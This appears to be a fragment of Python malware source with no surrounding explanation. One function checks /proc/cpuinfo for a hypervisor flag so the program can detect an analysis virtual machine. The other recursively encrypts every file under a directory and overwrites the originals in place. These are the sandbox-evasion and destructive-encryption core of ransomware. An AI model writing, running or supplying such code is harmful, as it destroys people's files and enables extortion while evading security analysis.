def is_virtual_machine():
    """Detect if running in a virtual machine"""
    try:
        # Check for virtualization-related markers
        with open('/proc/cpuinfo', 'r') as cpuinfo:
            for line in cpuinfo:
                if 'hypervisor' in line.lower():
                    return True
        return False
    except Exception as e:
        print(f"Error detecting virtual machine: {e}")
        return False

def encrypt_files(directory, key):
    """Encrypt all files in the specified directory"""
    try:
        cipher = Fernet(key)
        for root, _, files in os.walk(directory):
            for file in files:
                file_path = os.path.join(root, file)
                with open(file_path, 'rb') as f:
                    original_data = f.read()
                encrypted_data = cipher.encrypt(original_data)
                with open(file_path, 'wb') as f:
                    f.write(encrypted_data)
    except Exception as e:
        print(f"Error encrypting files: {e}")

